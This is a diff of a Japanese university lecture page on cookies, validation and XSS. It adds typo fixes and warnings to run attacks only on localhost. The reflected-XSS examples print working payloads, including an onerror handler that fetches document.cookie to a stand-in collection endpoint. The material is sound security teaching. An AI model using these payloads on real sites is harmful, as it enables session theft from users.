@@ -116,6 +116,45 @@ class="toc-section-number">7.4</span> サニタイズ (無害化) の方法</a><
 id="toc-flask-python-などでもxss脆弱性に注意"><span class="toc-section-number">7.5</span> Flask
 (Python) などでもXSS脆弱性に注意</a></li>
 </ul></li>
+<li><a href="#蓄積型xssstored-xss" id="toc-蓄積型xssstored-xss"><span
+class="toc-section-number">8</span> 蓄積型XSS（Stored XSS）</a>
+<ul>
+<li><a href="#反射型xssの振り返りと限界" id="toc-反射型xssの振り返りと限界"><span
+class="toc-section-number">8.1</span> 反射型XSSの振り返りと限界</a></li>
+<li><a href="#蓄積型xssstored-xssとは" id="toc-蓄積型xssstored-xssとは"><span
+class="toc-section-number">8.2</span> 蓄積型XSS（Stored XSS）とは</a></li>
+<li><a href="#プロジェクトにおける実装" id="toc-プロジェクトにおける実装"><span
+class="toc-section-number">8.3</span> プロジェクトにおける実装</a></li>
+<li><a href="#演習-stored-xssを体験する" id="toc-演習-stored-xssを体験する"><span
+class="toc-section-number">8.4</span> 📝演習 — Stored XSSを体験する</a></li>
+<li><a href="#なぜ-cart_session_id-が盗まれるのか"
+id="toc-なぜ-cart_session_id-が盗まれるのか"><span class="toc-section-number">8.5</span> なぜ
+cart_session_id が盗まれるのか</a></li>
+<li><a href="#防止策" id="toc-防止策"><span class="toc-section-number">8.6</span> 防止策</a></li>
+<li><a href="#定着確認-1" id="toc-定着確認-1"><span class="toc-section-number">8.7</span>
+定着確認</a></li>
+</ul></li>
+<li><a href="#蓄積型xssstored-xss応用編-フィッシングオーバーレイ"
+id="toc-蓄積型xssstored-xss応用編-フィッシングオーバーレイ"><span
+class="toc-section-number">9</span> 蓄積型XSS（Stored XSS）応用編 — フィッシングオーバーレイ</a>
+<ul>
+<li><a href="#前のセクションとの違い" id="toc-前のセクションとの違い"><span
+class="toc-section-number">9.1</span> 前のセクションとの違い</a></li>
+<li><a href="#フィッシングオーバーレイ攻撃とは" id="toc-フィッシングオーバーレイ攻撃とは"><span
+class="toc-section-number">9.2</span> フィッシングオーバーレイ攻撃とは</a></li>
+<li><a href="#攻撃ペイロードの詳細" id="toc-攻撃ペイロードの詳細"><span
+class="toc-section-number">9.3</span> 攻撃ペイロードの詳細</a></li>
+<li><a href="#演習-フィッシングオーバーレイを体験する"
+id="toc-演習-フィッシングオーバーレイを体験する"><span class="toc-section-number">9.4</span> 📝演習
+— フィッシングオーバーレイを体験する</a></li>
+<li><a href="#なぜ-memberabout-の-preview-では攻撃が成立しないのか"
+id="toc-なぜ-memberabout-の-preview-では攻撃が成立しないのか"><span
+class="toc-section-number">9.5</span> なぜ /member/about の Preview
+では攻撃が成立しないのか</a></li>
+<li><a href="#防止策-1" id="toc-防止策-1"><span class="toc-section-number">9.6</span>
+防止策</a></li>
+</ul></li>
+<li><a href="#補足" id="toc-補足"><span class="toc-section-number">10</span> 補足</a></li>
 </ul> 
         <!-- ---------------------------------------- -->
       </div>
@@ -147,11 +186,11 @@ id="toc-flask-python-などでもxss脆弱性に注意"><span class="toc-section
       <li>セッションベース認証</li>
       <li>トークンベース認証 (JWT)</li>
       <li>Content Security Policy (CSP)</li>
-      <li>Next.js ServerActions (Custom Invocation)</li>
+      <li>Next.js Server Actions (Custom Invocation)</li>
       </ul>
       <p>昨年度の<a
       href="https://takeshiwada1980.github.io/Programming3-2025/">プログラミング3</a>では<a
-      href="https://supabase.com/">Supabase</a>が提供する「<strong>ユーザ認証機能</strong>」を利用してウェブアプリを開発しましたが、ここではセキュティ
+      href="https://supabase.com/">Supabase</a>が提供する「<strong>ユーザ認証機能</strong>」を利用してウェブアプリを開発しましたが、ここではセキュリティ
       (認証・認可) に対する理解を深めるために <span
       class="masked">ゼロからユーザ認証機能を実装</span> していきます。</p>
       <h2 data-number="1.1" id="演習-30分"><span class="header-section-number">1.1</span> 演習
@@ -206,7 +245,7 @@ id="toc-flask-python-などでもxss脆弱性に注意"><span class="toc-section
       <li><code>src/app/shop/page.tsx</code></li>
       <li><code>src/app/_types/Product.ts</code></li>
       <li><code>src/app/api/products/route.ts</code></li>
-      <li><code>src/app/_types/CartItrem.ts</code></li>
+      <li><code>src/app/_types/CartItem.ts</code></li>
       <li><code>src/app/api/cart/route.ts</code></li>
       </ul></li>
       <li><strong>ログイン</strong> 👉 <code>http://localhost:3000/login</code>
@@ -245,7 +284,7 @@ git branch -D sandbox  # sandboxブランチの削除（必要に応じて）</c
       <p>なお、ファイルを保存・コミットせずに <code>main</code>
       ブランチに切り替えると、作業中の変更がそのまま
       <code>main</code>ブランチに持ち越されることがあるので注意してください。</p>
-      <p>また、DBの内容についても、以下のコマンで初期状態に戻しておいてください。</p>
+      <p>また、DBの内容についても、以下のコマンドで初期状態に戻しておいてください。</p>
       <pre><code>npx prisma db seed</code></pre>
       </div>
       <h1 data-number="2" id="データベースについて"><span class="header-section-number">2</span>
@@ -255,15 +294,16 @@ git branch -D sandbox  # sandboxブランチの削除（必要に応じて）</c
       というコマンドを使って、<strong>データベースのレコードをクリアした上で、定義済みの初期データを投入</strong>
       できるようにしています。このような処理は、一般に <strong>シーディング (Seeding)</strong>
       やシード処理、初期データ投入と呼ばれます。</p>
-      <p>なお、ここで使用する <code>npx prisma db seed</code> というコマンドは、</p>
+      <p>なお、ここで使用する <code>npx prisma db seed</code> は Prisma CLI
+      が提供しているコマンドですが、実際に実行されるシード処理の中身は、開発者が設定ファイルで指定します。</p>
       <ul>
       <li><code>npx prisma db push</code></li>
       <li><code>npx prisma generate</code></li>
       </ul>
-      <p>のように Prisma が標準で提供しているコマンド (ビルトインコマンド)
-      ではなく、以下で解説するように <span
-      class="masked">開発者が自分でスクリプトを用意し、設定することで使用可能になるカスタムコマンド</span>
-      となっています。</p>
+      <p>のようなコマンドは、それ自体の処理内容が Prisma によって定義されています。一方で
+      <code>npx prisma db seed</code> は、以下で解説するように <span
+      class="masked">開発者が自分で用意したスクリプトを、Prisma
+      のシード処理として実行するための入口</span> となっています。</p>
       <p><strong><i class="fa-solid fa-comment-dots fa-flip-horizontal"></i>プロンプト例</strong></p>
       <blockquote>
       <p>npx と npm というコマンドの違いがわかりません。解説してください。</p>
@@ -278,7 +318,7 @@ git commit --allow-empty -m &quot;Start week-5 branch&quot;</code></pre>
       <h2 data-number="2.2" id="prisma.config.ts-の変更-スクリプトの追加"><span
       class="header-section-number">2.2</span> prisma.config.ts の変更 (スクリプトの追加)</h2>
       <p>プロジェクトフォルダのルートにある <code>prisma.config.ts</code> に、以下の
-      <strong>第10行目</strong> ような設定を追加します。このファイルは Prisma
+      <strong>第10行目</strong> のような設定を追加します。このファイルは Prisma
       全体の挙動を制御する設定ファイル となります。</p>
       <p>クローンしてきたプロジェクトでは
       <strong>既に設定を追加済みなので</strong>、ここでは確認だけしてください。</p>
@@ -346,7 +386,9 @@ git commit --allow-empty -m &quot;Start week-5 branch&quot;</code></pre>
       <p>zod は、TypeScript
       において「<strong>入力データのバリデーション（検証ルール）</strong>」と「<strong>型定義</strong>」を統一的に記述できるライブラリとなっています。</p>
       <p>TypeScript には、変数やオブジェクトに対して「number 型」や「string
-      型」といった型を定義する機能があります。しかし、型定義だけでは、<span
+      型」といった型を定義する機能があります。しかし、TypeScript
+      の型情報は実行時には消えてしまうため、API
+      やフォームから受け取ったデータが本当に期待どおりの形であるかは、実行時に改めて確認する必要があります。また、型定義だけでは、<span
       class="masked">「0以上100以下の整数値」や「5文字以上20文字以下の文字列」</span>
       といった、具体的な制約条件までは表現できません。そのため、こうした条件を満たしているかどうかを確認する
       <strong>バリデーションロジック</strong> (入力値検証処理) を別途実装する必要があります。</p>
@@ -385,15 +427,15 @@ git commit --allow-empty -m &quot;Start week-5 branch&quot;</code></pre>
       <p>また、zod はクライアントサイド (フロントエンド) において、<strong>フォーム入力</strong> (＝
       <code>react-hook-form</code> の <code>useForm</code>) とも
       <strong>連携して強力なバリデーション機能を提供してくれます</strong>。</p>
-      <p>(プロンプト例)</p>
+      <p><strong><i class="fa-solid fa-comment-dots fa-flip-horizontal"></i>プロンプト例</strong></p>
       <blockquote>
       <p>Next.js (TypeScript)
       でウェブアプリを開発しています。「react-hook-form」の「useForm」とは何ですか？これを使わずにフォーム入力を実装するのと、使って実装するのでは、どのような違いがありますか？具体的なシナリオを例に分かりやすく説明してください。</p>
       </blockquote>
       <p>以下は、<code>react-hook-form</code> と <code>zod</code> を組み合わせて作成した入力フォーム
-      (<code>src/app/login.tsx</code> )
+      (<code>src/app/login/page.tsx</code> )
       の例です。このプロジェクトにおいては、<strong>ログイン機能</strong> (<code>/login</code>) や
-      <strong>サインイン機能</strong> (<code>/signup</code>) のなかで利用しています。</p>
+      <strong>サインアップ機能</strong> (<code>/signup</code>) のなかで利用しています。</p>
       <figure>
       <img src="figs/01/zod-01.png" alt="zod" />
       <figcaption aria-hidden="true">zod</figcaption>
@@ -477,7 +519,7 @@ git commit --allow-empty -m &quot;Start week-5 branch&quot;</code></pre>
       に対して独立したバリデーションスキーマを設定していますが、zod
       では<strong>複数のプロパティを参照する複合的なバリデーション</strong>
       (クロスフィールドバリデーション)
-      や、<strong>条件分岐をともうな複雑なバリデーション</strong>も可能になっています。</p>
+      や、<strong>条件分岐をともなう複雑なバリデーション</strong>も可能になっています。</p>
       <p>例えば、オブジェクトのなかの <span class="masked"><code>password</code> と
       <code>confirmPassword</code> の一致</span> を検証するようなバリデーションも設定可能です。</p>
       <p><strong><i class="fa-solid fa-comment-dots fa-flip-horizontal"></i>プロンプト例</strong></p>
@@ -546,6 +588,13 @@ git commit --allow-empty -m &quot;Start week-5 branch&quot;</code></pre>
 <span id="cb13-80"><a href="#cb13-80"></a>    email<span class="op">:</span> userSeed<span class="op">.</span><span class="at">email</span><span class="op">,</span></span>
 <span id="cb13-81"><a href="#cb13-81"></a>  }))<span class="op">,</span></span>
 <span id="cb13-82"><a href="#cb13-82"></a>})<span class="op">;</span></span></code></pre></div>
+      <p>なお、この例では <code>safeParse</code>
+      によってデータが妥当であることを確認したうえで、元の <code>userSeeds</code>
+      から必要なプロパティを取り出して DB に投入しています。zod
+      のスキーマで値の変換やデフォルト値の補完、余分なプロパティの除去などを行う設計にする場合は、検証後の
+      <code>result.data</code> を使って DB に投入するほうが安全です。</p>
+      <p>また、この段階では学習用の初期データとして平文のパスワードを扱っています。実運用の認証システムでは、パスワードをそのまま
+      DB に保存してはいけません。次回で扱うように、必ずハッシュ化した値を保存します。</p>
       <p>ここで、例えば <strong>第16行目</strong> の…</p>
       <ul>
       <li><code>email: "admin01@example.com",</code></li>
@@ -731,16 +780,18 @@ git commit --allow-empty -m &quot;Start week-5 branch&quot;</code></pre>
       <h2 data-number="4.3" id="ウェブアプリ開発者が-cookie-について最低限知っておくべきこと"><span
       class="header-section-number">4.3</span> ウェブアプリ開発者が Cookie
       について最低限知っておくべきこと</h2>
-      <p>安全なウェブアプリを開発するにあたり、Cookie について
-      のなかの以下のことを把握しておいてください。</p>
+      <p>安全なウェブアプリを開発するにあたり、Cookie
+      について、以下のことを把握しておいてください。</p>
       <ul>
       <li>ユーザ操作による通常のウェブナビゲーション（リンクをクリックするなど）において、Cookie
       は自動的にHTTPリクエストに付与されます。言い換えれば、ユーザが意識することなく自動で Cookie
       が送信されます。</li>
       <li>Cookie の内容は、ブラウザのデベロッパーツールを使って
       <strong>ユーザが内容を参照したり、書き換えたり、消去したりすることができます</strong>。</li>
-      <li>Cookie は、ひとつのドメインにつき、約 <span class="masked">4KB</span>
-      まで保持することができます（画像や長文を Cookie として保存することはできません）。</li>
+      <li>Cookie は、一般に <strong>1つの Cookie あたり約 <span class="masked">4KB</span></strong>
+      まで保持することができます（画像や長文を Cookie
+      として保存することはできません）。なお、ドメインごとの Cookie
+      の個数や総容量にも制限があり、その上限はブラウザによって異なります。</li>
       <li>Cookie は、基本的にサーバ側で発行するものですが、<strong>JavaScript
       を使ってクライアント側で Cookie
       を設定したり、読み込んだりすることもできます</strong>。ただし、後述する <span
@@ -753,11 +804,11 @@ git commit --allow-empty -m &quot;Start week-5 branch&quot;</code></pre>
       HTTPリクエストの送信に含めることはできます。</li>
       </ul></li>
       </ul>
-      <p>(プロンプト例)</p>
+      <p><strong><i class="fa-solid fa-comment-dots fa-flip-horizontal"></i>プロンプト例</strong></p>
       <blockquote>
       <p>サードパーティクッキーとは何ですか。</p>
       </blockquote>
-      <p>(プロンプト例)</p>
+      <p><strong><i class="fa-solid fa-comment-dots fa-flip-horizontal"></i>プロンプト例</strong></p>
       <blockquote>
       <p>サードパーティクッキーを利用した「リターゲティング広告」の仕組みについて教えてください。</p>
       </blockquote>
@@ -853,8 +904,16 @@ git commit --allow-empty -m &quot;Start week-5 branch&quot;</code></pre>
       <h3 data-number="4.4.2" id="httponly属性"><span class="header-section-number">4.4.2</span>
       HttpOnly属性</h3>
       <p>この属性が設定されている Cookie は <span class="masked">JavaScript
-      から値を読み込むことができなく</span> なります。<strong>XSS攻撃</strong>
-      によるセッションハイジャックを防ぐセキュリティ対策として「<strong>超重要</strong>」な設定となってきます。</p>
+      から値を読み込むことができなく</span> なります。<strong>XSS攻撃</strong> によって
+      <code>document.cookie</code> からセッション ID
+      などが窃取されることを防ぐセキュリティ対策として「<strong>超重要</strong>」な設定となってきます。</p>
+      <p>ただし、HttpOnly 属性は <strong>XSS
+      そのものを無効化する対策ではありません</strong>。攻撃者の JavaScript
+      がページ上で実行できる状態が残っていると、Cookie
+      の値を直接読めなくても、ユーザのブラウザから同一サイトの API
+      にリクエストを送るなど、別の悪用が可能になる場合があります。そのため、HttpOnly
+      は重要な防御層のひとつですが、後述するエスケープ処理・サニタイズ処理・CSP
+      などと組み合わせて考える必要があります。</p>
       <p><strong><i class="fa-solid fa-comment-dots fa-flip-horizontal"></i>プロンプト例</strong></p>
       <blockquote>
       <p>Cookie
@@ -903,16 +962,18 @@ git commit --allow-empty -m &quot;Start week-5 branch&quot;</code></pre>
       <li>すべてのクロスサイトリクエストで Cookie が送信されます。</li>
       <li>外部サイトをまたいだ Cookie 利用（サードパーティ Cookie）が必要な場合に使用します。</li>
       <li>この場合、Secure 属性（HTTPS 限定）との併用が必須となります。</li>
+      <li>Cookie がクロスサイトで送信されるため、CSRF トークンや Origin / Referer の検証など、別の
+      CSRF 対策を併用する必要があります。</li>
       </ul></li>
       </ul>
       <p>なお、<code>SameSite</code> が未指定の場合、主要ブラウザでは <code>Lax</code>
       として扱われます (Lax-by-default)。ただし、古いブラウザではクロスサイトリクエストでも Cookie
       が送信される場合があるため、安全性と挙動の一貫性のためにも、原則として SameSite
       は明示するようにしてください。</p>
-      <p>(プロンプト例)</p>
+      <p><strong><i class="fa-solid fa-comment-dots fa-flip-horizontal"></i>プロンプト例</strong></p>
       <blockquote>
       <p>Cookie の「SameSite属性」の strict と lax の違いが分かりません。strict
-      にするとにするとログイン周りの UX が悪くなると言われたのですが、具体例で説明してください。</p>
+      にするとログイン周りの UX が悪くなると言われたのですが、具体例で説明してください。</p>
       </blockquote>
       <h3 data-number="4.4.5" id="定着確認"><span class="header-section-number">4.4.5</span>
       定着確認</h3>
@@ -989,7 +1050,7 @@ git commit --allow-empty -m &quot;Start week-5 branch&quot;</code></pre>
       Cookie の運用が可能になります。なお、上記以外にも <code>Path</code> や <code>Max-Age</code>
       などの Cookie
       の属性が存在します。それらについて、ウェブや生成AIを使って概要を把握しておいてください。</p>
-      <p>(プロンプト例)</p>
+      <p><strong><i class="fa-solid fa-comment-dots fa-flip-horizontal"></i>プロンプト例</strong></p>
       <blockquote>
       <p>Cookie
       の「Max-Age属性」と「Expires属性」の違いについて教えてください。また、どのように使い分けますか。</p>
@@ -1012,7 +1073,7 @@ git commit --allow-empty -m &quot;Start week-5 branch&quot;</code></pre>
       (<code>document.cookie</code>の戻り値を外部送信するようなコード)
       が埋め込まれた場合、<strong>HttpOnly属性</strong> がついていない Cookie
       が窃取される可能性があるということになります。</p>
-      <p>(プロンプト例)</p>
+      <p><strong><i class="fa-solid fa-comment-dots fa-flip-horizontal"></i>プロンプト例</strong></p>
       <blockquote>
       <p>Cookie
       が窃取されたからって何か困ることがあるのですか？セッションIDなんて単なる数字の羅列でしょ？セッションID
@@ -1074,7 +1135,7 @@ git commit --allow-empty -m &quot;Start week-5 branch&quot;</code></pre>
       </div>
       <p>地域毎の「ニュース記事」は、<code>useState</code> で生成したステート変数の
       <code>region</code> の変更をトリガーに <code>/api/news</code> に対する <code>fetch</code>
-      を実行することで取得しています。以下の <strong>第74行目</strong> ように <code>fetch</code>
+      を実行することで取得しています。以下の <strong>第74行目</strong> のように <code>fetch</code>
       のオプションに <code>credentials: "include"</code> を設定することで、JavaScript から
       HTTPリクエストを送るときにも Cookie が付与されるようになります。</p>
       <div class="sourceCode" id="cb24"
@@ -1108,7 +1169,7 @@ git commit --allow-empty -m &quot;Start week-5 branch&quot;</code></pre>
       <h2 data-number="5.2" id="サーバサイド-バックエンド-の処理"><span
       class="header-section-number">5.2</span> サーバサイド (バックエンド) の処理</h2>
       <p>ウェブAPI <code>/api/news</code> にアクセスがあったときの処理は
-      <code>src/app/news/route.ts</code> に記述されています。サーバサイドでは、Cookie の値
+      <code>src/app/api/news/route.ts</code> に記述されています。サーバサイドでは、Cookie の値
       (<code>region=XXXXX</code>) に応じて DB からのデータ取得条件を変えています。</p>
       <div class="sourceCode" id="cb25" data-caption="src/app/api/news/route.ts (抜粋)"
       data-startFrom="4"><pre class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 3;"><span id="cb25-4"><a href="#cb25-4"></a><span class="im">import</span> { cookies } <span class="im">from</span> <span class="st">&quot;next/headers&quot;</span><span class="op">;</span></span></code></pre></div>
@@ -1202,7 +1263,7 @@ git commit --allow-empty -m &quot;Start week-5 branch&quot;</code></pre>
       が変わった際にキャッシュを明示的に破棄し、最新のデータ取得を強制する処理をしています。<code>mutate(ep)</code>
       は、引数 <code>ep</code> (実体は <code>/api/news</code>)
       から最新データを取得する命令になります。</p>
-      <p>(プロンプト例)</p>
+      <p><strong><i class="fa-solid fa-comment-dots fa-flip-horizontal"></i>プロンプト例</strong></p>
       <blockquote>
       <p>Next.js で、useState と useEffect を組み合わせて api
       からデータをフェッチしてくる処理を書いていたのですが、先輩からコードレビューで「useSWR
@@ -1223,7 +1284,7 @@ git commit --allow-empty -m &quot;Start week-5 branch&quot;</code></pre>
       <h1 data-number="6" id="ショップのコンテンツ"><span class="header-section-number">6</span>
       「ショップ」のコンテンツ</h1>
       <p>ショップ (<a href="http://localhost:3000/shop">http://localhost:3000/shop</a>)は
-      <strong>Cookie を利用してショッピングカート内の商品保持する機能</strong>
+      <strong>Cookie を利用してショッピングカート内の商品を保持する機能</strong>
       を持ったサンプルです。AIの支援を受けながら、以下のコードを読解してください。</p>
       <ul>
       <li><code>src/app/shop/page.tsx</code> … フロントエンド</li>
@@ -1232,7 +1293,7 @@ git commit --allow-empty -m &quot;Start week-5 branch&quot;</code></pre>
       </ul>
       <p>「ニュース」では <span class="masked">クライアントサイドで Cookie を発行</span>
       していましたが、「ショップ」では <strong>サーバサイド</strong>
-      (<code>src/app/cart/route.ts</code>) で Cookie
+      (<code>src/app/api/cart/route.ts</code>) で Cookie
       を発行しています。なお、Cookieの属性設定に不適切なものがありますが、次の「XSS脆弱性」のセクションに関係するものなので、そのままにしておいてください。</p>
       <h1 data-number="7" id="xss脆弱性"><span class="header-section-number">7</span> XSS脆弱性</h1>
       <p><strong>XSS</strong> (Cross-Site Scripting: クロスサイトスクリプティング)
@@ -1247,10 +1308,14 @@ git commit --allow-empty -m &quot;Start week-5 branch&quot;</code></pre>
       (<code>&lt;script&gt;alert("XSS")&lt;/script&gt;</code>) が実行されてしまいます。</p>
       <p>実行される JavaScriptコード
       が単にアラートを表示する程度のものであれば大した問題ではありません。しかし、強制実行される
-      JavaScriptコード が「<strong>Cookie情報の窃取</strong>」や「<strong>別のサイト
-      (フィッシングサイト) へのリダイレクト</strong>」、さらには「<strong>ユーザの意図しない操作
-      (XX予告の投稿操作やアカウント削除操作)</strong>」といった場合があり、これは非常に大きな問題となります。</p>
-      <p>(プロンプト例)</p>
+      JavaScriptコード が</p>
+      <ul>
+      <li><strong>Cookie情報の窃取</strong></li>
+      <li><strong>別のサイト (フィッシングサイト) へのリダイレクト</strong></li>
+      <li><strong>ユーザの意図しない操作 (XX予告の投稿操作やアカウント削除操作)</strong></li>
+      </ul>
+      <p>といった場合があり、これは非常に大きな問題となります。</p>
+      <p><strong><i class="fa-solid fa-comment-dots fa-flip-horizontal"></i>プロンプト例</strong></p>
       <blockquote>
       <p>ウェブアプリ開発およびXSS脆弱性の文脈で「サニタイズ処理」と「エスケープ処理」とはなんですか。また、それらの違いについて教えてください。</p>
       </blockquote>
@@ -1270,8 +1335,8 @@ git commit --allow-empty -m &quot;Start week-5 branch&quot;</code></pre>
       </figure>
       <p>上記の例のように <code>name=寝屋川タヌキ</code>
       をクエリパラメータとして与える分には特段の問題は生じません。しかし、<code>name=【JavaScriptプログラム】</code>
-      が与えられるたとき<strong>非常に危険な動作</strong>をします。</p>
-      <p>(プロンプト例)</p>
+      が与えられたとき<strong>非常に危険な動作</strong>をします。</p>
+      <p><strong><i class="fa-solid fa-comment-dots fa-flip-horizontal"></i>プロンプト例</strong></p>
       <blockquote>
       <p>URLのクエリパラメータにJSを仕込むようなのが反射型XSSであると聞きました。それ以外にもXSSにタイプがあるのですか？</p>
       </blockquote>
@@ -1301,23 +1366,39 @@ git commit --allow-empty -m &quot;Start week-5 branch&quot;</code></pre>
       <p>詳細は<a
       href="http://localhost:3000/news?name=%3Cimg%20src=x%20onerror=%22alert(&#39;Hoge!&#39;)%22%3E">こちら</a>をご覧ください</p>
       </blockquote>
-      <p>のようなリンクに仕込まれる可能性があります。</p>
-      <p>このような状態で、どのようなXSS攻撃を受ける可能性があるかを見ていきます。</p>
+      <p>のようにリンクに仕込まれる可能性があります。</p>
+      <div class="balloon char-01 face-01 tone-pink">
+      <p>このセクションでは、XSS
+      の危険性を理解するために攻撃コードを実際に動かします。自分の管理下にあるローカル環境
+      (<code>localhost</code>) のみで実行してください。</p>
+      <p>他人のサイトや外部サービスに対して同様の操作を行うことは絶対に避けてください。</p>
+      </div>
+      <p>このようにサニタイズされていない状態では「どのような XSS
+      リスクが生じるのか」を体験的に確認していきます。</p>
+      <div class="balloon char-01 face-02 tone-yellow">
+      <p><code>dangerouslySetInnerHTML</code> は、バニラ JavaScript（＝ライブラリを使わない素の
+      JavaScript）の <code>innerHTML</code> に近い役割を持つ仕組みです。</p>
+      <p>プログラミング3の <a
+      href="https://takeshiwada1980.github.io/Programming3-2025/lecture06.html#動作確認-1">ブログアプリの実装</a>
+      のなかでも、ブログ記事の記事本文をリッチに表示するために <code>dangerouslySetInnerHTML</code>
+      を使用しましたね。</p>
+      </div>
       <h3 data-number="7.2.1" id="例1-無害"><span class="header-section-number">7.2.1</span> 例1
       (無害)</h3>
-      <div class="sourceCode" id="cb31" data-caption="無害なクエリパラメータ"><pre
+      <div class="sourceCode" id="cb31"
+      data-caption="無害なクエリパラメータ (開発者が想定しているクエリパラメータ)"><pre
       class="sourceCode txt"><code class="sourceCode default"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=寝屋川タヌキ</span></code></pre></div>
-      <p>上記のURLをブラウザのアドレバーにコピペすると次のようになります。</p>
+      <p>上記のURLをブラウザのアドレスバーにコピペすると次のようになります。</p>
       <figure>
       <img src="figs/01/xss-01.png" alt="img" />
       <figcaption aria-hidden="true">img</figcaption>
       </figure>
       <p>ここでは、クエリパラメータが単なるテキスト (<code>寝屋川タヌキ</code>)
-      だったので、特に問題になることはおきません。</p>
+      だったので、特に問題になることは起きません。</p>
       <h3 data-number="7.2.2" id="例2"><span class="header-section-number">7.2.2</span> 例2</h3>
       <div class="sourceCode" id="cb32" data-caption="無害なクエリパラメータ？🤔"><pre
       class="sourceCode txt"><code class="sourceCode default"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=&lt;font size=20 color=&quot;brown&quot;&gt;&lt;b&gt;寝屋川タヌキ&lt;/b&gt;&lt;/font&gt;</span></code></pre></div>
-      <p>上記のURLをブラウザのアドレバーにコピペすると次のようになります。</p>
+      <p>上記のURLをブラウザのアドレスバーにコピペすると次のようになります。</p>
       <figure>
       <img src="figs/01/xss-02.png" alt="img" />
       <figcaption aria-hidden="true">img</figcaption>
@@ -1327,7 +1408,7 @@ git commit --allow-empty -m &quot;Start week-5 branch&quot;</code></pre>
       <h3 data-number="7.2.3" id="例3"><span class="header-section-number">7.2.3</span> 例3 💀</h3>
       <div class="sourceCode" id="cb33" data-caption="💀 XSS脆弱性を利用してJavaScriptを実行"><pre
       class="sourceCode txt"><code class="sourceCode default"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=&lt;img src=x onerror=&quot;alert(&#39;Hoge!&#39;)&quot;&gt;</span></code></pre></div>
-      <p>上記のURLをブラウザのアドレバーにコピペすると次のようになります。</p>
+      <p>上記のURLをブラウザのアドレスバーにコピペすると次のようになります。</p>
       <figure>
       <img src="figs/01/xss-03.png" alt="img" />
       <figcaption aria-hidden="true">img</figcaption>
@@ -1340,14 +1421,14 @@ git commit --allow-empty -m &quot;Start week-5 branch&quot;</code></pre>
       <li>結果として <code>alert('Hoge!')</code> という JavaScript
       が実行され、画面に「Hoge!」というアラートが表示される。</li>
       </ol>
-      <p>アラートが実行されたところで実害はありませんが、任意の JavaScript
-      が実行できてしまうことが非常に深刻な問題です。</p>
+      <p>アラートが実行されたところで実害はありませんが、<strong>任意の JavaScript
+      が実行できてしまうことが非常に深刻な問題</strong> です。</p>
       <h3 data-number="7.2.4" id="例4"><span class="header-section-number">7.2.4</span> 例4
       💀💀</h3>
       <div class="sourceCode" id="cb34"
       data-caption="💀💀 XSS脆弱性を利用してCookieを取得して表示"><pre
       class="sourceCode txt"><code class="sourceCode default"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=&lt;img src=x onerror=&quot;document.write(&#39;(ToT) =&gt; &#39;,document.cookie)&quot;&gt;</span></code></pre></div>
-      <p>上記のURLをブラウザのアドレバーにコピペすると次のようになります。</p>
+      <p>上記のURLをブラウザのアドレスバーにコピペすると次のようになります。</p>
       <figure>
       <img src="figs/01/xss-04.png" alt="img" />
       <figcaption aria-hidden="true">img</figcaption>
@@ -1355,12 +1436,12 @@ git commit --allow-empty -m &quot;Start week-5 branch&quot;</code></pre>
       <p>クエリパラメータに設定されているのは「<strong>HttpOnly属性が設定されていない Cookie
       を</strong> <code>document.cookie</code>
       <strong>によって読み出して画面に出力するJavaScript</strong>」のコードです。危険な香りがしてきましたが、自分の
-      Cookie が、自分の見ているが画面に出力されるだけで、特に実害はありません。</p>
+      Cookie が、自分の見ている画面に出力されるだけで、特に実害はありません。</p>
       <h3 data-number="7.2.5" id="例5"><span class="header-section-number">7.2.5</span> 例5
       💀💀💀</h3>
       <p>次のクエリパラメータには <code>document.cookie</code> で取得した Cookie を
-      <code>http://localhost:3000/api/xss</code> に送信して、その後、<code>/</code> に移動するような
-      JavaScript プログラムが設定されています。</p>
+      <code>http://localhost:3000/api/xss</code> 宛に送信して、その後、<code>/</code>
+      に移動するような JavaScript プログラムが設定されています。</p>
       <div class="sourceCode" id="cb35"
       data-caption="💀💀💀 XSS脆弱性を利用してCookieを取得して送信"><pre
       class="sourceCode txt"><code class="sourceCode default"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=&lt;img src=x onerror=&quot;fetch(&#39;http://localhost:3000/api/xss?c=&#39;+document.cookie);window.location.href=&#39;/&#39;&quot;&gt;</span></code></pre></div>
@@ -1377,11 +1458,12 @@ git commit --allow-empty -m &quot;Start week-5 branch&quot;</code></pre>
       <div class="sourceCode" id="cb36"
       data-caption="💀💀💀 XSS脆弱性を利用してCookieを取得して送信 (URLエンコード後)"><pre
       class="sourceCode txt"><code class="sourceCode default"><span id="cb36-1"><a href="#cb36-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=%3Cimg+src%3Dx+onerror%3D%22fetch%28%27http%3A%2F%2Flocalhost%3A3000%2Fapi%2Fxss%3Fc%3D%27%2Bdocument.cookie%29%3Bwindow.location.href%3D%27%2F%27%22%3E</span></code></pre></div>
-      <p>これを貼り付けて実行すると、自分の Cookie が <code>http://localhost:3000/api/xss</code>
+      <p>これをアドレスバーに貼り付けて実行すると、自分の Cookie が
+      <code>http://localhost:3000/api/xss</code>
       宛に送信されます😇。ここでは実験のために、自分のウェブアプリのウェブAPIに情報を送っていますが、実際の攻撃時には、攻撃者😈の用意した
       URL となります。</p>
       <p>プロジェクトフォルダのなかの <code>src/app/api/xss/route.ts</code>
-      を読解してもらうと分かるとおもいますが、<code>http://localhost:3000/api/xss?c=HogeFugaPiyo</code>
+      を読解してもらうと分かると思いますが、<code>http://localhost:3000/api/xss?c=HogeFugaPiyo</code>
       のようにクエリパラメータをつけてアクセスすると、<code>c=</code> の部分、つまり
       <code>HogeFugaPiyo</code> を DB の <code>stolenContent</code>
       に保存する仕組みになっています。</p>
@@ -1432,15 +1514,22 @@ git commit --allow-empty -m &quot;Start week-5 branch&quot;</code></pre>
 <span id="cb38-31"><a href="#cb38-31" aria-hidden="true" tabindex="-1"></a>  <span class="bu">print</span>(<span class="ss">f&#39;カートの内容: </span><span class="sc">{</span>json<span class="sc">.</span>dumps(cart_items, indent<span class="op">=</span><span class="dv">2</span>)<span class="sc">}</span><span class="ss">&#39;</span>)</span></code></pre></div>
       <p>以上で、Cookie
